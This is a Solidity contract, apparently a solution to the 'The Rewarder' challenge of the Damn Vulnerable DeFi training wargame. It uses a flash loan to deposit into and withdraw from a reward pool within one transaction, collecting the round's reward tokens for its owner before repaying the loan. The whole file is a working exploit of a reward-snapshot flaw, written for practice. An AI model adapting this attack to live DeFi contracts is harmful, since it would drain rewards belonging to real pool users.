// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import {TheRewarderPool} from "./TheRewarderPool.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {Owned} from "solmate/Auth/Owned.sol";
import {RewardToken} from "./RewardToken.sol";

contract RewarderExploit is Owned {
    TheRewarderPool public immutable theRewarderPool;
    DamnValuableToken public immutable damnValuableToken;
    FlashLoanerPool public immutable flashLoanerPool;
    RewardToken public immutable rewardToken;

    constructor(
        address _theRewarderPoolAddress,
        address _damnValuableTokenAddress,
        address _flashLoanerPoolAddress,
        address _rewardToken
    ) Owned(msg.sender) {
        // constructor code
        theRewarderPool = TheRewarderPool(_theRewarderPoolAddress);
        damnValuableToken = DamnValuableToken(_damnValuableTokenAddress);
        flashLoanerPool = FlashLoanerPool(_flashLoanerPoolAddress);
        rewardToken = RewardToken(_rewardToken);
    }

    function flashLoan(uint256 amount) external {
        flashLoanerPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        // handle flashloan
        damnValuableToken.approve(address(theRewarderPool), type(uint256).max);
        theRewarderPool.deposit(amount);
        theRewarderPool.withdraw(amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
        damnValuableToken.transfer(address(flashLoanerPool), amount);
        // deposit
    }
}
